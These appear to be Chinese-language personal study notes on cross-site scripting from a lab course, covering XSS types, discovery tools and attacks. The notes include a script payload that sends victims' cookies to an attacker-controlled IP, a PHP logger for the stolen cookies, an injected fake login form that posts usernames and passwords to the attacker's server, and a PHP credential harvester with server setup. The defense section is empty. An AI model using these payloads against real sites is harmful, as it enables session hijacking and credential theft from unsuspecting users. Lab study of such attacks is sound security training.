# xss基础


### 存储型


### 反射型

有两种类型的`非持久性 XSS` 漏洞：`反射型 XSS，`由后端服务器处理，以及`基于 DOM 的 XSS`，它完全在客户端处理，永远不会到达后端服务器。与持久性 XSS 不同，`非持久性 XSS` 漏洞是暂时的，不会在页面刷新后持续存在。因此，我们的攻击只影响目标用户，不会影响访问该页面的其他用户。

当我们的输入到达后端服务器并在未经过过滤或清理的情况下返回给我们时，就会发生`反射型 XSS` 漏洞。在许多情况下，我们的整个输入可能会返回给我们，例如错误消息或确认消息。在这些情况下，我们可能会尝试使用 XSS 有效负载来查看它们是否执行。但是，由于这些通常是临时消息，一旦我们从页面移动，它们就不会再次执行，因此它们是`非持久的`。

**HTBA的例子-cookie**

需要一个可以接收cookie的服务器，可以拿python直接创建一个：
```bash
python3 -m http.server
```

还需要一个可以执行获取cookie的php文件：
```php
<?php $cookie = $_GET['cookie']; 
$ip = getenv('REMOTE_ADDR'); 
$time = date('Y-m-d g:i:s'); 
$referer = getenv('HTTP_REFERER'); 
$fp = fopen( 'cookie.txt', 'a'); 
fwrite($fp,"IP: ".$ip." │ Date And Time: ".$time." | Referer: ".$referer." | Cookie: ".$cookie.'|||'); 
fclose($fp); 
?>
```

然后就是payload:
```javascript
<script>document.write('<img src="http://10.10.16.30:8000/getcookie.php?cookie='+document.cookie+'" />');</script>
```

把payload输入文本框就可以拿到cookie了。

### DOM xss

`反射型 XSS` 通过 HTTP 请求将输入数据发送到后端服务器，而 DOM XSS 则完全通过 JavaScript 在客户端进行处理。当使用 JavaScript 通过`文档对象模型 （DOM）` 更改页面源时，会发生 DOM XSS。

另一方面，`Sink` 是将用户输入写入页面上的 DOM 对象的函数。如果 `Sink` 函数没有正确清理用户输入，则容易受到 XSS 攻击。一些常用的 JavaScript 函数可以写入 DOM 对象：
- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

此外，一些写入 DOM 对象的 `jQuery` 库函数是：
- `add()`
- `after()`
- `append()`

如果我们尝试之前一直在使用的 XSS 有效负载，我们将看到它不会执行。这是因为 `innerHTML` 函数不允许在其中使用 `<script>` 标签作为安全功能。尽管如此，我们还使用许多其他不包含 `<script>` 标记的 XSS 有效负载，例如以下 XSS 有效负载：
```html
<img src="" onerror=alert(window.origin)>
```
上面的代码行创建了一个新的 HTML 图像对象，该对象具有一个 `onerror` 属性，该属性可以在找不到图像时执行 JavaScript 代码。因此，由于我们提供了一个空的图像链接 （`“”`），因此我们的代码应该始终执行，而不必使用 `<script>` 标签

### 自动发现

几乎所有的 Web 应用程序漏洞扫描程序（如 [Nessus](https://www.tenable.com/products/nessus)、[Burp Pro](https://portswigger.net/burp/pro) 或 [ZAP](https://www.zaproxy.org/)）都具有检测所有三种类型的 XSS 漏洞的各种功能

一些可以帮助我们发现 XSS 的常见开源工具是 [XSS Strike](https://github.com/s0md3v/XSStrike)、[Brute XSS](https://github.com/rajeshmajumdar/BruteXSS) 和 [XSSer](https://github.com/epsylon/xsser)。

### 手动发现

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) 上的 XSS 有效负载列表或 [PayloadBox](https://github.com/payloadbox/xss-payload-list) 中的有效负载列表


# xss攻击

### 页面污损

嘲讽专用，慎重学习，容易被打死

### 钓鱼

xss居然可以钓鱼

XSS 网络钓鱼攻击的一种常见形式是通过注入虚假登录表单，将登录详细信息发送到攻击者的服务器，然后可以使用该服务器代表受害者登录并控制他们的帐户和敏感信息。

注入代码：
```html
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP10.10.16.28:8000/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

删除掉image url的代码：

```html
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

删除url表单：
```javascript
document.getElementById('urlform').remove();
```

image url的代码：
```html
<form role="form" action="index.php" method="GET" id="urlform">
                <input type="text" placeholder="Image URL" name="url">
            </form>
```

本机服务器处理的php代码：

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

建立php监听服务器;
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```

### 会话劫持



# xss防护



# 实战

**xss获取cookie**
```javascript
<script>document.write('<img src="http://192.168.211.1/xss/getcookie.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>
```

自己服务器运行的php接收文件：
```php
<?php $cookie = $_GET['cookie']; 
$ip = getenv('REMOTE_ADDR'); $time = date('Y-m-d g:i:s'); 
$referer = getenv('HTTP_REFERER'); 
$fp = fopen( 'cookie.txt', 'a'); fwrite($fp,"IP: ".$ip." │ Date And Time: ".$time." | Referer: ".$referer." | Cookie: ".$cookie.'|||'); 
fclose($fp); 
?>
```


